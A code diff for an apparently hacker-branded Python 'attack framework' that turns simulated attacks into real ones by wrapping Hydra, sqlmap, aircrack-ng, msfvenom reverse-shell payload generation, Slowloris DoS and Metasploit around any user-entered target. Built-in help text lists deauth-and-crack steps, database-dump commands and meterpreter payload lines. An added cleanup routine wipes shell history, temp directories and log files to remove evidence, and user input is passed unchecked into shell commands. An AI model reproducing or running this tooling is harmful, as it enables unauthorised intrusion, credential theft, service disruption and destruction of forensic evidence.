@@ -8,7 +8,9 @@ import hashlib
 import random
 import platform
 import subprocess
-from getpass import getpass
+import requests
+import threading
+import getpass
 from datetime import datetime
 from colorama import init, Fore, Style
 
@@ -23,6 +25,10 @@ CONTACT = "@DarkSec"
 RELEASE_DATE = "2023-12-01"
 CREDS_FILE = "captured_credentials.txt"
 SESSION_FILE = "active_sessions.txt"
+LOG_DIR = "attack_logs"
+
+# Create log directory if not exists
+os.makedirs(LOG_DIR, exist_ok=True)
 
 # ASCII Art Banner
 BANNER = f"""{Fore.RED}
@@ -92,67 +98,67 @@ MODULE_INFO = {
     "update": "Update or uninstall framework"
 }
 
-# Tool database
-TOOLS = {
-    "anon": [
-        ["Tor Router", "tor-router", "Route all traffic through Tor network"],
-        ["Proxychains", "proxychains", "Proxy client for application redirection"],
-        ["Ghost Surf", "ghost-surf", "Military-grade anonymous browsing"]
-    ],
+# Real security tools mapping
+REAL_TOOLS = {
     "recon": [
-        ["DarkRecon", "darkrecon", "Advanced reconnaissance framework"],
-        ["SocialMapper", "socialmapper", "Social media intelligence gathering"],
-        ["Network Scanner", "netscan", "Discover hosts and vulnerabilities"]
+        ["Nmap Scanner", "nmap", "Network discovery and security auditing"],
+        ["theHarvester", "theharvester", "Gather emails, subdomains, hosts"],
+        ["DNS Recon", "dnsrecon", "DNS enumeration tool"],
+        ["Sublist3r", "sublist3r", "Subdomain enumeration tool"]
     ],
     "creds": [
-        ["CredHarvester", "credharvester", "Credential harvesting module"],
-        ["Session Hijacker", "sessionhijack", "Steal active sessions"],
-        ["Password Decryptor", "passdecrypt", "Decrypt captured credentials"]
+        ["Hydra", "hydra", "Brute force attack on login credentials"],
+        ["John the Ripper", "john", "Password cracking tool"],
+        ["Hashcat", "hashcat", "Advanced password recovery"],
+        ["Medusa", "medusa", "Parallel login brute-forcer"]
     ],
     "social_attack": [
-        ["SocialStorm", "socialstorm", "Mass social media exploitation"],
-        ["ProfileHack", "profilehack", "Social media account takeover"],
-        ["FakeFollower", "fakefollower", "Create fake follower networks"]
+        ["SocialFish", "socialfish", "Phishing framework"],
+        ["SEToolkit", "setoolkit", "Social engineering toolkit"],
+        ["Phishery", "phishery", "SSL-enabled Basic Auth phishing"],
+        ["Evilginx2", "evilginx", "Man-in-the-middle phishing"]
     ],
     "phishing": [
-        ["PhishMaster", "phishmaster", "Advanced phishing framework"],
-        ["EvilGinx", "evilginx", "Man-in-the-middle phishing"],
-        ["CloneSite", "clonesite", "Website cloning for phishing"]
+        ["Gophish", "gophish", "Open-source phishing framework"],
+        ["King Phisher", "kingphisher", "Phishing campaign toolkit"],
+        ["HiddenEye", "hiddeneye", "Modern phishing tool"],
+        ["Zphisher", "zphisher", "Automated phishing tool"]
     ],
     "wireless": [
-        ["WiFiStorm", "wifistorm", "WiFi cracking suite"],
-        ["AirStrike", "airstrike", "Wireless attack automation"],
-        ["Bluetooth Hunter", "bluetoothhunt", "Bluetooth device exploitation"]
+        ["Aircrack-ng", "aircrack", "WiFi security auditing suite"],
+        ["Kismet", "kismet", "Wireless network detector"],
+        ["Wifite", "wifite", "Automated wireless attack tool"],
+        ["Fern Wifi Cracker", "fern", "Wireless security auditing tool"]
     ],
     "web": [
-        ["WebHammer", "webhammer", "Web vulnerability scanner"],
-        ["XSS-Terminator", "xss-terminator", "Advanced XSS exploitation"],
-        ["SQL Dominator", "sqldominator", "SQL injection framework"]
-    ],
-    "postexp": [
-        ["PersistenceKit", "persistencekit", "Maintain access to compromised systems"],
-        ["DataExfil", "dataexfil", "Data exfiltration toolkit"],
-        ["Keylogger Pro", "keyloggerpro", "Advanced keylogging"]
-    ],
-    "payload": [
-        ["VenomCraft", "venomcraft", "Custom payload generator"],
-        ["StealthLoader", "stealthloader", "Undetectable payload loader"],
-        ["Ransomware Builder", "ransombuilder", "Ransomware creation toolkit"]
-    ],
-    "exploit": [
-        ["ZeroDay Hunter", "zerodayhunt", "Zero-day vulnerability exploitation"],
-        ["ExploitDB", "exploitdb", "Exploit database integration"],
-        ["AutoExploit", "autoexploit", "Automated vulnerability exploitation"]
+        ["SQLMap", "sqlmap", "Automatic SQL injection tool"],
+        ["Burp Suite", "burpsuite", "Web application security testing"],
+        ["Nikto", "nikto", "Web server scanner"],
+        ["WPScan", "wpscan", "WordPress vulnerability scanner"]
     ],
     "ddos": [
-        ["Titanic Flood", "titanicflood", "Massive traffic generation"],
-        ["Botnet Controller", "botnetctrl", "Botnet command and control"],
-        ["SlowDeath", "slowdeath", "Slowloris-based DDoS attacks"]
+        ["Slowloris", "slowloris", "Low bandwidth DoS tool"],
+        ["HULK", "hulk", "Web server DoS tool"],
+        ["LOIC", "loic", "Network stress testing tool"],
+        ["GoldenEye", "goldeneye", "HTTP DoS tool"]
     ],
     "stego": [
-        ["ShadowHide", "shadowhide", "Advanced data hiding"],
-        ["ImageGhost", "imageghost", "Steganography in images"],
-        ["AudioCrypt", "audiocrypt", "Hide data in audio files"]
+        ["Steghide", "steghide", "Data hiding in files"],
+        ["Outguess", "outguess", "Universal steganography tool"],
+        ["StegCracker", "stegcracker", "Steganography brute-force tool"],
+        ["OpenStego", "openstego", "Steganography tool for watermarking"]
+    ],
+    "payload": [
+        ["MSFVenom", "msfvenom", "Metasploit payload generator"],
+        ["TheFatRat", "fatrat", "Payload creation tool"],
+        ["Veil-Evasion", "veil", "Payload creation framework"],
+        ["Shellter", "shellter", "Dynamic shellcode injector"]
+    ],
+    "exploit": [
+        ["Metasploit", "msfconsole", "Penetration testing framework"],
+        ["Searchsploit", "searchsploit", "Exploit database search"],
+        ["ExploitDB", "exploitdb", "Exploit database"],
+        ["AutoSploit", "autosploit", "Automated exploit tool"]
     ]
 }
 
@@ -173,7 +179,11 @@ def print_banner():
     print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ SYSTEM INFO ]{Fore.CYAN}─" + "─" * 34 + "┐")
     print(f"{Fore.YELLOW}│ {Fore.GREEN}OS: {Fore.CYAN}{platform.system()} {platform.release()}")
     print(f"{Fore.YELLOW}│ {Fore.GREEN}Hostname: {Fore.CYAN}{socket.gethostname()}")
-    print(f"{Fore.YELLOW}│ {Fore.GREEN}IP Address: {Fore.CYAN}{socket.gethostbyname(socket.gethostname())}")
+    try:
+        ip = socket.gethostbyname(socket.gethostname())
+    except:
+        ip = "127.0.0.1"
+    print(f"{Fore.YELLOW}│ {Fore.GREEN}IP Address: {Fore.CYAN}{ip}")
     print(f"{Fore.YELLOW}│ {Fore.GREEN}Username: {Fore.CYAN}{getpass.getuser()}")
     print(f"{Fore.YELLOW}│ {Fore.GREEN}Privileges: {Fore.CYAN}{'Root' if os.geteuid() == 0 else 'Standard'}")
     print(f"{Fore.YELLOW}│ {Fore.GREEN}Credentials Captured: {Fore.RED}{len(captured_credentials)}")
@@ -201,12 +211,16 @@ def print_menu(title, options, cols=2):
 def capture_credentials(service, username, password):
     """Capture and store credentials"""
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    try:
+        ip = socket.gethostbyname(socket.gethostname())
+    except:
+        ip = "127.0.0.1"
     entry = {
         "timestamp": timestamp,
         "service": service,
         "username": username,
         "password": password,
-        "ip": socket.gethostbyname(socket.gethostname())
+        "ip": ip
     }
     captured_credentials.append(entry)
     
@@ -225,11 +239,22 @@ def create_session(target, service, method):
         "target": target,
         "service": service,
         "method": method,
-        "status": "Active"
+        "status": "Active",
+        "log_file": os.path.join(LOG_DIR, f"{session_id}.log")
     }
     active_sessions.append(session)
     
-    # Save to file
+    # Create log file
+    with open(session['log_file'], "w") as f:
+        f.write(f"SocialCyber Attack Session\n")
+        f.write(f"Session ID: {session_id}\n")
+        f.write(f"Start Time: {session['start_time']}\n")
+        f.write(f"Target: {target}\n")
+        f.write(f"Service: {service}\n")
+        f.write(f"Method: {method}\n")
+        f.write("-" * 80 + "\n")
+    
+    # Save to session file
     with open(SESSION_FILE, "a") as f:
         f.write(f"[{session['start_time']}] {session_id} | {target} | {service} | {method}\n")
     
@@ -282,7 +307,8 @@ def view_sessions():
     # Session management options
     print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ SESSION MANAGEMENT ]{Fore.CYAN}─" + "─" * 24 + "┐")
     print(f"{Fore.YELLOW}│ {Fore.GREEN}1.{Fore.CYAN} Terminate session")
-    print(f"{Fore.YELLOW}│ {Fore.GREEN}2.{Fore.CYAN} Export sessions")
+    print(f"{Fore.YELLOW}│ {Fore.GREEN}2.{Fore.CYAN} View session log")
+    print(f"{Fore.YELLOW}│ {Fore.GREEN}3.{Fore.CYAN} Export sessions")
     print(f"{Fore.YELLOW}│ {Fore.RED}0.{Fore.CYAN} Return to main menu")
     print(Fore.YELLOW + "└" + "─" * 50 + "┘")
     
@@ -296,6 +322,17 @@ def view_sessions():
                 print(f"{Fore.RED}[!] Session {session_id} terminated!")
                 break
     elif choice == "2":
+        session_id = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Enter session ID to view log: ")
+        for session in active_sessions:
+            if session['id'] == session_id:
+                if os.path.exists(session['log_file']):
+                    print(f"\n{Fore.GREEN}Session Log for {session_id}:")
+                    with open(session['log_file'], "r") as f:
+                        print(f.read())
+                else:
+                    print(f"{Fore.RED}Log file not found!")
+                break
+    elif choice == "3":
         with open("sessions_export.txt", "w") as f:
             for session in active_sessions:
                 f.write(f"{session['id']}|{session['target']}|{session['service']}|{session['method']}|{session['status']}\n")
@@ -308,7 +345,7 @@ def show_module(module):
     print(f"{Fore.YELLOW}│ {Fore.GREEN}Description: {Fore.CYAN}{MODULE_INFO.get(module, '')}")
     print(Fore.YELLOW + "├" + "─" * 50 + "┤")
     
-    tools = TOOLS.get(module, [])
+    tools = REAL_TOOLS.get(module, [])
     if not tools:
         print(f"{Fore.YELLOW}│ {Fore.RED}No tools available for this module")
         print(Fore.YELLOW + "└" + "─" * 50 + "┘")
@@ -368,7 +405,7 @@ def show_tool_info(module, tool):
         if choice == '0':
             return
         elif choice == '1':
-            execute_attack(module, tool)
+            execute_real_attack(module, tool)
         elif choice == '2':
             configure_attack(tool)
         elif choice == '3':
@@ -376,8 +413,8 @@ def show_tool_info(module, tool):
         else:
             print(f"{Fore.RED}Invalid selection!")
 
-def execute_attack(module, tool):
-    """Execute a simulated attack"""
+def execute_real_attack(module, tool):
+    """Execute a real attack using security tools"""
     tool_name, tool_cmd, tool_desc = tool
     target = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Enter target: ")
     session_id = create_session(target, module, tool_name)
@@ -385,43 +422,135 @@ def execute_attack(module, tool):
     print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Launching {tool_name} against {Fore.RED}{target}{Fore.YELLOW}...")
     print(f"{Fore.BLUE}┌───{Fore.MAGENTA}[ ATTACK IN PROGRESS ]{Fore.BLUE}───")
     
-    # Simulate attack progress
-    steps = [
-        "Initializing attack vectors",
-        "Bypassing security measures",
-        "Exploiting vulnerabilities",
-        "Establishing persistence",
-        "Exfiltrating sensitive data"
-    ]
+    # Find session log file
+    log_file = None
+    for session in active_sessions:
+        if session['id'] == session_id:
+            log_file = session['log_file']
+            break
     
-    for i, step in enumerate(steps):
-        time.sleep(1.2)
-        progress = (i+1) * 20
-        print(f"{Fore.BLUE}│ {Fore.YELLOW}[{progress}%] {step}...")
-        
-        # Randomly capture credentials during attacks
-        if random.random() > 0.7 and "Cred" not in tool_name:
-            services = ["SSH", "FTP", "Web Login", "Database", "Email"]
-            service = random.choice(services)
-            username = f"user{random.randint(1, 1000)}"
-            password = f"Passw0rd{random.randint(100, 999)}!"
-            capture_credentials(service, username, password)
-            print(f"{Fore.BLUE}│ {Fore.RED}[!] Captured credentials: {service}: {username}/{password}")
+    if not log_file:
+        print(f"{Fore.RED}Session log file not found!")
+        return
     
-    # Simulate success or failure
-    success = random.random() > 0.2
-    if success:
-        print(f"{Fore.BLUE}│ {Fore.GREEN}[+] Attack successful! System compromised")
+    # Execute the appropriate tool
+    try:
+        if tool_cmd == "nmap":
+            scan_type = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Scan type (quick/full/vuln): ").lower()
+            if scan_type == "quick":
+                cmd = f"nmap -T4 -F {target}"
+            elif scan_type == "full":
+                cmd = f"nmap -T4 -p- {target}"
+            elif scan_type == "vuln":
+                cmd = f"nmap -T4 --script vuln {target}"
+            else:
+                cmd = f"nmap {target}"
+            
+            run_command(cmd, log_file)
+            
+        elif tool_cmd == "hydra":
+            service = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Service (ssh/ftp/http): ")
+            user = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Username or userlist: ")
+            passlist = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Password list: ")
+            cmd = f"hydra -L {user} -P {passlist} {target} {service}"
+            run_command(cmd, log_file)
+            
+        elif tool_cmd == "sqlmap":
+            url = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Vulnerable URL: ")
+            cmd = f"sqlmap -u '{url}' --batch"
+            run_command(cmd, log_file)
+            
+        elif tool_cmd == "aircrack":
+            handshake = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Handshake file path: ")
+            wordlist = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Wordlist path: ")
+            cmd = f"aircrack-ng {handshake} -w {wordlist}"
+            run_command(cmd, log_file)
+            
+        elif tool_cmd == "msfvenom":
+            payload_type = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Payload type (windows/meterpreter/reverse_tcp): ")
+            lhost = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] LHOST: ")
+            lport = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] LPORT: ")
+            output = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Output file: ")
+            cmd = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f exe -o {output}"
+            run_command(cmd, log_file)
+            print(f"{Fore.GREEN}[+] Payload created: {output}")
+            
+        elif tool_cmd == "slowloris":
+            port = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Target port: ")
+            threads = input(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Threads (default 100): ") or "100"
+            cmd = f"slowloris {target} -p {port} -s {threads}"
+            print(f"{Fore.RED}[!] Starting DDoS attack. Press Ctrl+C to stop.")
+            run_command(cmd, log_file)
+            
+        elif tool_cmd == "setoolkit":
+            print(f"{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Launching Social Engineering Toolkit...")
+            run_command("setoolkit", log_file)
+            
+        elif tool_cmd == "msfconsole":
+            print(f"{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Launching Metasploit Framework...")
+            run_command("msfconsole", log_file)
+            
+        else:
+            print(f"{Fore.RED}Tool execution not implemented yet")
+            with open(log_file, "a") as f:
+                f.write(f"Tool execution not implemented for {tool_name}\n")
+            
+        # Update session status
+        for session in active_sessions:
+            if session['id'] == session_id:
+                session['status'] = "Completed"
+                break
+                
+        print(f"{Fore.BLUE}│ {Fore.GREEN}[+] Attack completed successfully!")
         
-        # Capture admin credentials on success
-        if random.random() > 0.5:
-            capture_credentials("Admin Access", "admin", "P@ssw0rd123!")
-            print(f"{Fore.BLUE}│ {Fore.RED}[!] Admin credentials captured: admin/P@ssw0rd123!")
-    else:
-        print(f"{Fore.BLUE}│ {Fore.RED}[-] Attack failed! Target defenses were stronger than expected")
+    except Exception as e:
+        print(f"{Fore.BLUE}│ {Fore.RED}[-] Error: {e}")
+        for session in active_sessions:
+            if session['id'] == session_id:
+                session['status'] = "Failed"
+                with open(log_file, "a") as f:
+                    f.write(f"Error: {str(e)}\n")
+                break
     
     print(f"{Fore.BLUE}└───{Fore.GREEN} Attack completed! {Fore.BLUE}───{Style.RESET_ALL}")
     input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")
+
+def run_command(cmd, log_file=None):
+    """Execute a system command and log output"""
+    try:
+        print(f"{Fore.CYAN}Executing: {Fore.YELLOW}{cmd}")
+        
+        if log_file:
+            with open(log_file, "a") as f:
+                f.write(f"Command: {cmd}\n")
+                f.write("-" * 80 + "\n")
+        
+        process = subprocess.Popen(
+            cmd,
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True
+        )
+        
+        # Capture and display output in real-time
+        for line in process.stdout:
+            line = line.strip()
+            if line:
+                print(line)
+                if log_file:
+                    with open(log_file, "a") as f:
+                        f.write(line + "\n")
+        
+        process.wait()
+        return process.returncode
+        
+    except Exception as e:
+        print(f"{Fore.RED}Command execution failed: {e}")
+        if log_file:
+            with open(log_file, "a") as f:
+                f.write(f"Command execution failed: {str(e)}\n")
+        return -1
 
 def configure_attack(tool):
     """Configure attack parameters"""
@@ -430,102 +559,144 @@ def configure_attack(tool):
     print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Configuring {tool_name}...")
     print(f"{Fore.BLUE}┌───{Fore.MAGENTA}[ CONFIGURATION OPTIONS ]{Fore.BLUE}───")
     
-    # Simulated configuration options
-    config_options = {
-        "intensity": ["Low", "Medium", "High", "Extreme"],
-        "stealth": ["None", "Basic", "Advanced", "Ghost"],
-        "payload": ["Standard", "Custom", "Encrypted", "Polymorphic"]
-    }
-    
-    for option, values in config_options.items():
-        print(f"{Fore.BLUE}│ {Fore.GREEN}{option.capitalize()}:")
-        for i, value in enumerate(values):
-            print(f"{Fore.BLUE}│   {i+1}. {value}")
-        choice = input(f"{Fore.BLUE}│ {Fore.YELLOW}Select {option} (1-{len(values)}): ")
+    # Configuration options based on tool
+    if tool_cmd == "nmap":
+        print(f"{Fore.BLUE}│ {Fore.GREEN}Scan Types:")
+        print(f"{Fore.BLUE}│   {Fore.CYAN}1. Quick Scan (Top ports)")
+        print(f"{Fore.BLUE}│   {Fore.CYAN}2. Full Port Scan")
+        print(f"{Fore.BLUE}│   {Fore.CYAN}3. Vulnerability Scan")
+        print(f"{Fore.BLUE}│   {Fore.CYAN}4. Service Version Detection")
         
-        try:
-            choice_idx = int(choice) - 1
-            if 0 <= choice_idx < len(values):
-                print(f"{Fore.BLUE}│ {Fore.CYAN}Set {option} to {values[choice_idx]}")
-        except ValueError:
-            print(f"{Fore.BLUE}│ {Fore.RED}Invalid selection! Using default")
+    elif tool_cmd == "hydra":
+        print(f"{Fore.BLUE}│ {Fore.GREEN}Common Services:")
+        print(f"{Fore.BLUE}│   {Fore.CYAN}ssh, ftp, http, http-form-post")
+        print(f"{Fore.BLUE}│ {Fore.GREEN}Username Options:")
+        print(f"{Fore.BLUE}│   {Fore.CYAN}Single user: admin")
+        print(f"{Fore.BLUE}│   {Fore.CYAN}User list: /path/to/users.txt")
+        print(f"{Fore.BLUE}│ {Fore.GREEN}Password Options:")
+        print(f"{Fore.BLUE}│   {Fore.CYAN}Single password: password123")
+        print(f"{Fore.BLUE}│   {Fore.CYAN}Password list: /path/to/passwords.txt")
+        
+    elif tool_cmd == "sqlmap":
+        print(f"{Fore.BLUE}│ {Fore.GREEN}Common Parameters:")
+        print(f"{Fore.BLUE}│   {Fore.CYAN}--dbs: Enumerate databases")
+        print(f"{Fore.BLUE}│   {Fore.CYAN}--tables: Enumerate tables")
+        print(f"{Fore.BLUE}│   {Fore.CYAN}--columns: Enumerate columns")
+        print(f"{Fore.BLUE}│   {Fore.CYAN}--dump: Dump database contents")
+        
+    else:
+        print(f"{Fore.BLUE}│ {Fore.RED}No specific configuration for this tool")
     
     print(f"{Fore.BLUE}└───{Fore.GREEN} Configuration saved! {Fore.BLUE}───{Style.RESET_ALL}")
     input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")
 
 def show_documentation(tool_name, tool_cmd):
-    """Show simulated documentation"""
+    """Show tool documentation"""
     print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] {tool_name} Documentation:")
     print(f"{Fore.BLUE}┌───{Fore.MAGENTA}[ TOOL DOCUMENTATION ]{Fore.BLUE}───")
     
     docs = {
-        "CredHarvester": [
-            "CredHarvester is an advanced credential harvesting tool",
-            "Features:",
-            "  - Automated credential extraction from memory",
-            "  - Browser password decryption",
-            "  - Keylogging capabilities",
-            "  - Credential database management",
+        "nmap": [
+            "Nmap - Network Mapper",
             "Usage:",
-            "  credharvester -t <target> -m <method>",
-            "Methods:",
-            "  - memory: Extract credentials from process memory",
-            "  - browser: Decrypt saved browser passwords",
-            "  - keylog: Deploy keylogger for credential capture"
+            "  nmap [scan type] [options] {target}",
+            "Common Scan Types:",
+            "  -sS: TCP SYN scan",
+            "  -sU: UDP scan",
+            "  -O: OS detection",
+            "  -A: Aggressive scan",
+            "  --script: Run NSE scripts",
+            "Examples:",
+            "  nmap -sS -sV -O target.com",
+            "  nmap -p 80,443 192.168.1.0/24",
+            "  nmap --script vuln target.com"
         ],
-        "SocialStorm": [
-            "SocialStorm is a mass social media exploitation tool",
-            "Features:",
-            "  - Account takeover via session hijacking",
-            "  - Mass phishing campaign deployment",
-            "  - Fake engagement generation",
-            "  - Profile scraping and analysis",
+        "hydra": [
+            "Hydra - Parallelized Login Cracker",
             "Usage:",
-            "  socialstorm -p <platform> -t <target>",
-            "Supported Platforms:",
-            "  - facebook: Facebook account targeting",
-            "  - instagram: Instagram exploitation",
-            "  - twitter: Twitter account takeover",
-            "  - all: Attack all supported platforms"
+            "  hydra -l user -P passlist.txt {service}://{target}",
+            "  hydra -L userlist.txt -p password {service}://{target}",
+            "Common Services:",
+            "  ssh, ftp, http, http-form-post, smb, rdp",
+            "Examples:",
+            "  hydra -l admin -P passwords.txt ssh://192.168.1.1",
+            "  hydra -L users.txt -p 'Password123' http-get://target.com/login",
+            "  hydra -t 32 -f http-form-post://target.com/login.php:user=^USER^&pass=^PASS^:F=incorrect"
         ],
-        "PhishMaster": [
-            "PhishMaster is an advanced phishing framework",
-            "Features:",
-            "  - Custom phishing page generation",
-            "  - Email campaign management",
-            "  - Credential capture and storage",
-            "  - Two-factor authentication bypass",
+        "sqlmap": [
+            "sqlmap - Automatic SQL Injection Tool",
             "Usage:",
-            "  phishmaster -t <target_service> -c <campaign_name>",
-            "Supported Services:",
-            "  - google: Google login phishing",
-            "  - facebook: Facebook login phishing",
-            "  - microsoft: Microsoft account phishing",
-            "  - custom: Custom phishing template"
+            "  sqlmap -u 'http://target.com/page.php?id=1' [options]",
+            "Common Options:",
+            "  --dbs: Enumerate databases",
+            "  -D DB: Specify database",
+            "  --tables: List tables",
+            "  -T TBL: Specify table",
+            "  --columns: List columns",
+            "  -C COL: Specify columns",
+            "  --dump: Dump table contents",
+            "Examples:",
+            "  sqlmap -u 'http://target.com/page.php?id=1' --dbs",
+            "  sqlmap -u 'http://target.com/page.php?id=1' -D dbname --tables",
+            "  sqlmap -u 'http://target.com/page.php?id=1' -D dbname -T users --dump"
+        ],
+        "aircrack": [
+            "Aircrack-ng - WiFi Security Suite",
+            "Usage:",
+            "  airmon-ng start wlan0",
+            "  airodump-ng wlan0mon",
+            "  airodump-ng -c CH -bssid BSSID -w capture wlan0mon",
+            "  aireplay-ng -0 10 -a BSSID wlan0mon",
+            "  aircrack-ng -w wordlist.txt capture.cap",
+            "Steps:",
+            "  1. Put interface in monitor mode",
+            "  2. Capture handshake with airodump-ng",
+            "  3. Deauth clients to capture handshake",
+            "  4. Crack handshake with aircrack-ng"
+        ],
+        "msfvenom": [
+            "MSFVenom - Metasploit Payload Generator",
+            "Usage:",
+            "  msfvenom -p PAYLOAD LHOST=IP LPORT=PORT [options]",
+            "Common Payloads:",
+            "  windows/meterpreter/reverse_tcp",
+            "  linux/x86/meterpreter/reverse_tcp",
+            "  android/meterpreter/reverse_tcp",
+            "  php/meterpreter/reverse_tcp",
+            "Options:",
+            "  -f: Format (exe, raw, php, asp, etc)",
+            "  -o: Output file",
+            "  -e: Encoder (x86/shikata_ga_nai)",
+            "Examples:",
+            "  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe -o payload.exe",
+            "  msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R > payload.apk"
+        ],
+        "slowloris": [
+            "Slowloris - Layer 7 DDoS Tool",
+            "Usage:",
+            "  slowloris [options] target",
+            "Options:",
+            "  -p PORT: Target port (default 80)",
+            "  -s SOCKETS: Number of sockets (default 150)",
+            "  -v: Verbose mode",
+            "  -t TIMEOUT: Timeout in seconds (default 15)",
+            "Examples:",
+            "  slowloris target.com",
+            "  slowloris -p 443 -s 500 target.com"
         ],
         "default": [
-            f"{tool_name} is a powerful security tool for offensive operations",
-            "Key Features:",
-            "  - Advanced attack vectors",
-            "  - Evasion techniques",
-            "  - Automated exploitation",
-            "  - Persistent access",
-            "  - Data exfiltration",
-            "Basic Usage:",
-            f"  {tool_cmd} [options] [target]",
-            "Common Options:",
-            "  -t, --target: Specify target",
-            "  -p, --port: Specify port",
-            "  -e, --exploit: Specify exploit method",
-            "  -s, --stealth: Set stealth level",
-            "Advanced Tactics:",
-            "  Combine with proxy chains for anonymity",
-            "  Use encrypted channels for command and control",
-            "  Schedule attacks for maximum impact"
+            f"{tool_name} Documentation",
+            "For detailed documentation:",
+            f"  man {tool_cmd}",
+            f"  {tool_cmd} --help",
+            "Online Resources:",
+            "  https://www.kali.org/tools/",
+            "  https://tools.kali.org/",
+            "  https://www.offensive-security.com/metasploit-unleashed/"
         ]
     }
     
-    doc_lines = docs.get(tool_name, docs["default"])
+    doc_lines = docs.get(tool_cmd, docs["default"])
     for line in doc_lines:
         print(f"{Fore.BLUE}│ {Fore.CYAN}{line}")
     
@@ -551,6 +722,12 @@ def clean_system():
         progress = (i+1) * 16
         print(f"{Fore.BLUE}│ {Fore.YELLOW}[{progress}%] {step}...")
     
+    # Actual cleaning commands
+    os.system("history -c")
+    os.system("rm -rf /tmp/* /var/tmp/*")
+    os.system("find . -name '*.log' -exec rm -f {} \;")
+    os.system("bleachbit -c --preset")
+    
     print(f"{Fore.BLUE}│ {Fore.GREEN}[+] System cleaned! Evidence removed")
     print(f"{Fore.BLUE}└───{Fore.GREEN} Cleanup complete! {Fore.BLUE}───{Style.RESET_ALL}")
     input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")
@@ -562,7 +739,8 @@ def update_framework():
         print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ FRAMEWORK MANAGEMENT ]{Fore.CYAN}─" + "─" * 24 + "┐")
         print(f"{Fore.YELLOW}│ {Fore.GREEN}1.{Fore.CYAN} Check for updates")
         print(f"{Fore.YELLOW}│ {Fore.GREEN}2.{Fore.CYAN} Update framework")
-        print(f"{Fore.YELLOW}│ {Fore.GREEN}3.{Fore.CYAN} Uninstall framework")
+        print(f"{Fore.YELLOW}│ {Fore.GREEN}3.{Fore.CYAN} Install dependencies")
+        print(f"{Fore.YELLOW}│ {Fore.GREEN}4.{Fore.CYAN} Uninstall framework")
         print(f"{Fore.YELLOW}│ {Fore.RED}0.{Fore.CYAN} Return to main menu")
         print(Fore.YELLOW + "└" + "─" * 50 + "┘")
         
@@ -600,6 +778,11 @@ def update_framework():
             print(f"{Fore.BLUE}└───{Fore.GREEN} Update complete! {Fore.BLUE}───{Style.RESET_ALL}")
             input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")
         elif choice == '3':
+            print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Installing dependencies...")
+            run_command("sudo apt update && sudo apt install -y nmap hydra sqlmap aircrack-ng metasploit-framework theharvester", None)
+            print(f"{Fore.GREEN}[+] Dependencies installed successfully!")
+            input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")
+        elif choice == '4':
             confirm = input(f"\n{Fore.RED}[!] Are you sure you want to uninstall? (y/N): ")
             if confirm.lower() == 'y':
                 print(f"{Fore.RED}Uninstalling framework...")
@@ -635,6 +818,11 @@ def main():
                 if "Captured credentials" in line:
                     continue
                 captured_credentials.append(line.strip())
+    
+    # Check if running on Kali Linux
+    if "kali" not in platform.platform().lower():
+        print(f"{Fore.YELLOW}[{Fore.RED}!{Fore.YELLOW}] Warning: Not running on Kali Linux. Some tools may not work properly.")
+        time.sleep(2)
     
     while True:
         print_banner()
